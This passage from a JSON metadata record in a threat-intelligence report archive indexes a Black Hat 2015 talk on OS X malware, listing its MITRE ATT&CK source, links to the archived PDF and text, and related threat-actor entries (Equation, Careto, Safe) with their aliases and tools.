https://reverse.put.as/2013/11/23/breaking-os-x-signed-kernel-extensions-with-a-nop/\n\n - www.newosxbook.com - mac hacker's handbook talks/books\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "99fdc3ef-333d-48f5-a4a1-becd788c7b80",
            "created_at": "2022-10-25T15:28:29.802983Z",
            "updated_at": "2022-10-25T15:28:29.802983Z",
            "deleted_at": null,
            "name": "MITRE",
            "url": "https://github.com/mitre-attack/attack-stix-data",
            "description": "MITRE ATT&CK STIX Data",
            "reports": null
        }
    ],
    "references": [
        "https://www.blackhat.com/docs/us-15/materials/us-15-Wardle-Writing-Bad-A-Malware-For-OS-X.pdf"
    ],
    "report_names": [
        "us-15-Wardle-Writing-Bad-A-Malware-For-OS-X.pdf"
    ],
    "threat_actors": [
        {
            "id": "b740943a-da51-4133-855b-df29822531ea",
            "created_at": "2022-10-25T15:50:23.604126Z",
            "updated_at": "2025-03-27T02:00:55.505366Z",
            "deleted_at": null,
            "main_name": "Equation",
            "aliases": [
                "Equation"
            ],
            "source_name": "MITRE:Equation",
            "tools": null,
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "67bf0462-41a3-4da5-b876-187e9ef7c375",
            "created_at": "2022-10-25T16:07:23.44832Z",
            "updated_at": "2025-03-27T02:02:09.806007Z",
            "deleted_at": null,
            "main_name": "Careto",
            "aliases": [
                "Careto",
                "The Mask",
                "Ugly Face"
            ],
            "source_name": "ETDA:Careto",
            "tools": [
                "Careto"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1666716494,
    "ts_updated_at": 1743041369,
    "ts_creation_date": 1437459316,
    "ts_modification_date": 1437459316,
    "files": {
        "pdf": "https://archive.orkl.eu/f3fee13a932e4445d40980ebf30a9a6e7cceb613.pdf",
        "text": "https://archive.orkl.eu/f3fee13a932e4445d40980ebf30a9a6e7cceb613.txt",
        "img": "https://archive.orkl.eu/f3fee13a932e4445d40980ebf30a9a6e7cceb613.jpg"
    }
}